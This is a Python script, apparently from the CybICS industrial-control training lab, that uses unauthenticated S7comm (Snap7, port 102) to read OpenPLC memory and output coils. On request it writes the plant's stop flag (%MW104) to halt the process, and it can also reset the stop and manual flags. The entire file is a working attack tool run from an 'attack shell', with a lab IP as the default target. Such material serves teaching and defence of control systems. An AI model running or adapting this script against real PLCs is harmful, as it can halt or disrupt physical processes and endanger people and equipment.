#!/usr/bin/env python3
"""S7 Side Door: read and change OpenPLC's memory over S7comm instead of Modbus.

OpenPLC's built-in Snap7 server (port 102) maps the PLC's %MW memory words to
data block DB1002, two bytes per word, big-endian: %MWn is DB1002 byte 2*n.

    python3 s7_sidedoor.py            # show the plant's memory (read only)
    python3 s7_sidedoor.py stop       # set the stop flag %MW104 to 1
    python3 s7_sidedoor.py restore    # set stop and manual back to 0

Run it from the attack shell (172.18.0.100). Always restore the plant when you
are done.
"""
import argparse
import struct
import sys
import time

import snap7
from snap7.type import Areas

MEMORY_DB = 1002
# Words of the CybICS program (software/OpenPLC/cybICS.st), %MW index -> name
WORDS = {100: "gst", 102: "hpt", 104: "stop", 106: "manual",
         108: "systemSen", 110: "boSen"}
COILS = ["heartbeat", "compressor", "systemValve", "gstSig"]   # %QX0.0-%QX0.3


def byte_offset(mw):
    return 2 * mw


def read_word(client, mw):
    return struct.unpack(">H", client.db_read(MEMORY_DB, byte_offset(mw), 2))[0]


def write_word(client, mw, value):
    client.db_write(MEMORY_DB, byte_offset(mw), bytearray(struct.pack(">H", value)))


def show(client):
    first, last = min(WORDS), max(WORDS)
    raw = client.db_read(MEMORY_DB, byte_offset(first), byte_offset(last) - byte_offset(first) + 2)
    for mw, name in WORDS.items():
        off = byte_offset(mw) - byte_offset(first)
        value = struct.unpack(">H", raw[off:off + 2])[0]
        print(f"  %MW{mw:<4} DB{MEMORY_DB}.DBW{byte_offset(mw):<4} {name:<10} = {value}")
    # The located outputs %QX0.x are the S7 process image of outputs (PA).
    outputs = client.read_area(Areas.PA, 0, 0, 1)[0]
    states = ", ".join(f"{n}={'ON' if outputs >> i & 1 else 'off'}" for i, n in enumerate(COILS))
    print(f"  %QX0.0-0.3 PA byte 0          {states}")


def main():
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("action", nargs="?", choices=["show", "stop", "restore"], default="show")
    parser.add_argument("--ip", default="172.18.0.3", help="OpenPLC address (default 172.18.0.3)")
    args = parser.parse_args()

    client = snap7.client.Client()
    try:
        client.connect(args.ip, 0, 1)          # rack 0, slot 1
    except Exception as e:
        print(f"[-] Cannot connect to {args.ip}:102 over S7comm: {e}")
        return 1
    print(f"[+] Connected to {args.ip}:102, CPU state: {client.get_cpu_state()}")

    try:
        if args.action == "stop":
            write_word(client, 104, 1)
            print("[+] Wrote 1 to the stop flag (%MW104 = DB1002.DBW208)")
            time.sleep(0.5)
        elif args.action == "restore":
            write_word(client, 104, 0)
            write_word(client, 106, 0)
            print("[+] Wrote 0 to stop (%MW104) and manual (%MW106): automatic mode")
            time.sleep(0.5)
        show(client)
        if args.action == "stop" and read_word(client, 104) != 1:
            print("[-] The stop flag did not stick")
            return 1
    finally:
        client.disconnect()
    return 0


if __name__ == "__main__":
    sys.exit(main())
